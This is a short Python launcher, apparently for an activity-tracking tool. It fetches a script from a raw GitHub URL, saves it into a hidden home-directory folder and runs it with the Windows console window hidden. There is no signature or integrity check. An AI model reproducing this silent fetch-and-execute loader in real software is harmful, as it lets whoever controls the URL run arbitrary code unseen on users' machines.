import os
import sys
import requests
import time
import subprocess
import platform

# The secure URL where the compiled tracker logic is hosted.
# This bypasses Github caches and Windows limits.
UPDATE_URL = "https://raw.githubusercontent.com/SamaOps/ActivityWatch/main/activity_tracker_mdm.py"

def main():
    home_dir = os.path.expanduser("~")
    tracker_dir = os.path.join(home_dir, ".aw_tracker")
    os.makedirs(tracker_dir, exist_ok=True)
    
    script_path = os.path.join(tracker_dir, "activity_tracker_dynamic.py")
    
    try:
        # 1. Check for updates using a math timestamp to completely destroy caching
        url = f"{UPDATE_URL}?t={time.time()}"
        res = requests.get(url, timeout=15)
        
        if res.status_code == 200:
            new_code = res.text
            
            current_code = ""
            if os.path.exists(script_path):
                with open(script_path, "r") as f:
                    current_code = f.read()
                    
            if new_code.strip() != current_code.strip():
                # Write the fresh code to the hidden folder
                with open(script_path, "w") as f:
                    f.write(new_code)
                    
    except Exception as e:
        # If network fails, just ignore and run the existing downloaded script
        pass
        
    # 2. Execute the downloaded script
    if os.path.exists(script_path):
        kwargs = {}
        if platform.system() == "Windows":
            kwargs['creationflags'] = 0x08000000 # Hide black console window
            
        subprocess.run([sys.executable, script_path], **kwargs)

if __name__ == "__main__":
    main()
